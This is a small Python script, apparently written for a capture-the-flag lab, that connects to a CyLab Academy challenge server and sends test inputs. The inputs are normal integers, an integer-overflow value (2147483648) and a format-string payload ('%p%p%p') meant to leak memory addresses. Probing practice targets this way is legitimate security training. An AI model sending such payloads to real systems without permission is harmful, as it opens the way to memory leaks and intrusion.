import sys, re, socket, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "mars.cylabacademy.net", 31929


def recv_until(s, marker=b":", timeout=6.0):
    s.settimeout(timeout)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            c = s.recv(4096)
            if not c:
                break
            buf += c
            if marker in buf[-8:]:
                break
        except socket.timeout:
            break
    return buf


def run(vals, wait=1.0):
    try:
        s = socket.create_connection((host, port), timeout=12)
    except Exception as e:
        return "CONNECT ERR %s" % type(e).__name__
    out = b""
    try:
        out += recv_until(s)
        for v in vals:
            s.sendall(str(v).encode() + b"\n")
            time.sleep(0.3)
            out += recv_until(s, timeout=4.0)
        time.sleep(wait)
        try:
            out += s.recv(8192)
        except Exception:
            pass
    except Exception as e:
        out += ("\n[ERR %s]" % type(e).__name__).encode()
    finally:
        try:
            s.close()
        except Exception:
            pass
    return out.decode("latin-1", "replace")


print("=== entiers valides ===")
print(run([1, 2, 3, 3])[:600])
print("\n=== grand nombre (debordement) ===")
print(run([2147483648, 2, 3, 3])[:600])
print("\n=== format string en N ===")
print(run([1, 2, 3, "%p%p%p"])[:600])
